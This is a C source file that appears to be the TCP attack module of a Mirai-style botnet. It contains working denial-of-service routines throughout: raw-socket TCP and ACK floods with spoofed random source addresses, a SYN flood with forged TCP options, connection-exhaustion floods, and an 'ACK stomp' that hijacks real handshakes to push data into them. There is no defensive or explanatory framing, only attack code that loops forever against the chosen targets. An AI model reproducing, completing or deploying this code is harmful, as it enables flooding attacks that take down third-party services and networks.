#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include "includes.h"

#include "attack.h"
#include "checksum.h"
#include "rand.h"

#define NONBLOCK(fd) fcntl(fd, F_SETFL, fcntl(fd, F_GETFL) | O_NONBLOCK)

static void cleanup_tcp_attack(char **pkts, int targs_len, int fd) {
    if (pkts) {
        for (int i = 0; i < targs_len; i++) {
            if (pkts[i]) {
                free(pkts[i]);
            }
        }
        free(pkts);
    }
    if (fd >= 0) {
        close(fd);
    }
}

void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd = -1;
    char **pkts = NULL;
    
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        cleanup_tcp_attack(NULL, 0, fd);
        return;
    }

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) {
        cleanup_tcp_attack(NULL, 0, fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1510, sizeof(char));
        if (!pkts[i]) {
            cleanup_tcp_attack(pkts, targs_len, fd);
            return;
        }
        
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = htons(rand_next() & 0xffff);

        rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            if (!pkts[i]) continue;
            
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = htons(rand_next() & 0xffff);
            if (sport == 0xffff)
                tcph->source = htons(rand_next() & 0xffff);
            if (dport == 0xffff)
                tcph->dest = htons(rand_next() & 0xffff);
            if (seq == 0xffff)
                tcph->seq = htonl(rand_next());
            if (ack == 0xffff)
                tcph->ack_seq = htonl(rand_next());
            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, 
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
    
    cleanup_tcp_attack(pkts, targs_len, fd);
}

void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    uint16_t size = 0;
    uint16_t port = 0;

    size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1); 
    port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 22);

    struct sockaddr_in addr;
    char *buf = (char *)malloc(size);
    if (!buf) return;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    memset(buf, 0, size);

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    for (int clear = 0; clear < MAX_FDS; clear++)
    {
        states[clear].fd = -1;
        states[clear].state = 0;
        states[clear].timeout = 0;
    }

    while(1)
    {
        fd_set write_set;
        struct timeval timeout;
        socklen_t err_len = sizeof(int);

        for(int i = 0; i < MAX_FDS; i++)
        {
            switch(states[i].state)
            {
                case 0:
                    if((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }
                    NONBLOCK(states[i].fd);
                    errno = 0;
                    if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                    
                case 1:
                {
                    int err = 0;
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);

                    timeout.tv_usec = 10;
                    timeout.tv_sec = 0;

                    int fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(fds == 1)
                    {
                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if(err)
                        {
                            close(states[i].fd);
                            states[i].fd = -1;
                            states[i].state = 0;
                            states[i].timeout = 0;
                            continue;
                        }
                        states[i].state = 2;
                    }
                    else if(fds == -1)
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }

                    if(states[i].timeout + 5 < time(NULL))
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                }
                    
                case 2:
                {
                    uint16_t send_size = size;
                    if(send_size == 1)
                        send_size = 500 + (rand_next() % 400);
                        
                    rand_str((unsigned char*)buf, send_size);
                    if(send(states[i].fd, buf, send_size, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                }
            }
        }
    }
    
    free(buf);
    for (int i = 0; i < MAX_FDS; i++) {
        if (states[i].fd >= 0) {
            close(states[i].fd);
        }
    }
}

void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    BOOL rand_len = attack_get_opt_int(opts_len, opts, ATK_OPT_RAND_LEN, TRUE);
    uint16_t len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 900); 
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    struct sockaddr_in addr;
    char *buf = calloc(len, sizeof(char));
    if (!buf) return;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    for (int i = 0; i < MAX_FDS; i++)
    {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
    }

    while (TRUE)
    {
        fd_set write_set;
        struct timeval timeout;
        socklen_t err_len = sizeof(int);

        for(int i = 0; i < MAX_FDS; i++)
        {
            switch(states[i].state)
            {
                case 0:
                    if((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }
                    fcntl(states[i].fd, F_SETFL, O_NONBLOCK | fcntl(states[i].fd, F_GETFL, 0));
                    errno = 0;
                    if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                    
                case 1:
                {
                    int err = 0;
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);
                    timeout.tv_usec = 10;
                    timeout.tv_sec = 0;

                    int fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(fds == 1)
                    {
                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if(err)
                        {
                            close(states[i].fd);
                            states[i].fd = -1;
                            states[i].state = 0;
                            states[i].timeout = 0;
                            continue;
                        }
                        states[i].state = 2;
                    }
                    else if(fds == -1)
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }

                    if(states[i].timeout + 5 < time(NULL))
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                }
                    
                case 2:
                {
                    uint16_t send_len = len;
                    if (rand_len && len > 500)
                        send_len = ((rand_next() % (len - 500)) + 500);
                        
                    rand_str((unsigned char*)buf, send_len);
                    if(send(states[i].fd, buf, send_len, MSG_NOSIGNAL) == -1 && errno != EAGAIN) 
                    {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                }
            }
        }
    }
    
    free(buf);
    for (int i = 0; i < MAX_FDS; i++) {
        if (states[i].fd >= 0) {
            close(states[i].fd);
        }
    }
}

void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd = -1;
    char **pkts = NULL;
    
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) {
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts_ptr;

        pkts[i] = calloc(128, sizeof(char));
        if (!pkts[i]) {
            cleanup_tcp_attack(pkts, targs_len, fd);
            return;
        }
        
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts_ptr = (uint8_t *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;

        *opts_ptr++ = PROTO_TCP_OPT_MSS;    
        *opts_ptr++ = 4;                    
        *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() & 0x0f));
        opts_ptr += sizeof(uint16_t);

        *opts_ptr++ = PROTO_TCP_OPT_SACK;
        *opts_ptr++ = 2;

        *opts_ptr++ = PROTO_TCP_OPT_TSVAL;
        *opts_ptr++ = 10;
        *((uint32_t *)opts_ptr) = rand_next();
        opts_ptr += sizeof(uint32_t);
        *((uint32_t *)opts_ptr) = 0;
        opts_ptr += sizeof(uint32_t);

        *opts_ptr++ = 1;

        *opts_ptr++ = PROTO_TCP_OPT_WSS;
        *opts_ptr++ = 3;
        *opts_ptr++ = 6;
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            if (!pkts[i]) continue;
            
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = htons(rand_next() & 0xffff);
            if (sport == 0xffff)
                tcph->source = htons(rand_next() & 0xffff);
            if (dport == 0xffff)
                tcph->dest = htons(rand_next() & 0xffff);
            if (seq == 0xffff)
                tcph->seq = htonl(rand_next());
            if (ack == 0xffff)
                tcph->ack_seq = htonl(rand_next());
            if (urg_fl)
                tcph->urg_ptr = htons(rand_next() & 0xffff);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, 
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
    
    cleanup_tcp_attack(pkts, targs_len, fd);
}

void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd = -1;
    char **pkts = NULL;
    
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) {
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1510, sizeof(char));
        if (!pkts[i]) {
            cleanup_tcp_attack(pkts, targs_len, fd);
            return;
        }
        
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = htons(rand_next() & 0xffff);

        rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            if (!pkts[i]) continue;
            
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = htons(rand_next() & 0xffff);
            if (sport == 0xffff)
                tcph->source = htons(rand_next() & 0xffff);
            if (dport == 0xffff)
                tcph->dest = htons(rand_next() & 0xffff);
            if (seq == 0xffff)
                tcph->seq = htonl(rand_next());
            if (ack == 0xffff)
                tcph->ack_seq = htonl(rand_next());
            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, 
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
    
    cleanup_tcp_attack(pkts, targs_len, fd);
}

void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd = -1;
    struct attack_stomp_data *stomp_data = NULL;
    char **pkts = NULL;
    
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        return;
    }
    
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(rfd);
        return;
    }

    stomp_data = calloc(targs_len, sizeof(struct attack_stomp_data));
    pkts = calloc(targs_len, sizeof(char *));
    if (!stomp_data || !pkts) {
        free(stomp_data);
        free(pkts);
        close(rfd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        int fd = -1;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[1024];
        time_t start_recv;

    stomp_setup_nums:

        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }

        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
 
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = htons(rand_next() & 0xffff);
        else
            addr.sin_port = htons(dport);

        connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
        start_recv = time(NULL);

        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof(struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                close(fd);
                goto cleanup_and_return;
            }
            
            if (ret > 0 && recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof(struct iphdr) + sizeof(struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));
                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph_pkt;
                        char *payload;

                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif
                        
                        pkts[i] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                        if (!pkts[i]) {
                            close(fd);
                            goto cleanup_and_return;
                        }
                        
                        iph = (struct iphdr *)pkts[i];
                        tcph_pkt = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph_pkt + 1);

                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;

                        tcph_pkt->source = stomp_data[i].sport;
                        tcph_pkt->dest = stomp_data[i].dport;
                        tcph_pkt->seq = htonl(stomp_data[i].ack_seq);
                        tcph_pkt->ack_seq = htonl(stomp_data[i].seq);
                        tcph_pkt->doff = 8;
                        tcph_pkt->fin = fin_fl;
                        tcph_pkt->ack = ack_fl;
                        tcph_pkt->window = htons(rand_next() & 0xffff);
                        tcph_pkt->urg = urg_fl;
                        tcph_pkt->psh = psh_fl;
                        tcph_pkt->rst = rst_fl;
                        tcph_pkt->syn = syn_fl;

                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
        
        close(fd);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            if (!pkts[i]) continue;
            
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = htons(rand_next() & 0xffff);

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->seq = htonl(stomp_data[i].seq++);
            tcph->ack_seq = htonl(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, 
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }

cleanup_and_return:
    if (stomp_data) free(stomp_data);
    cleanup_tcp_attack(pkts, targs_len, rfd);
}
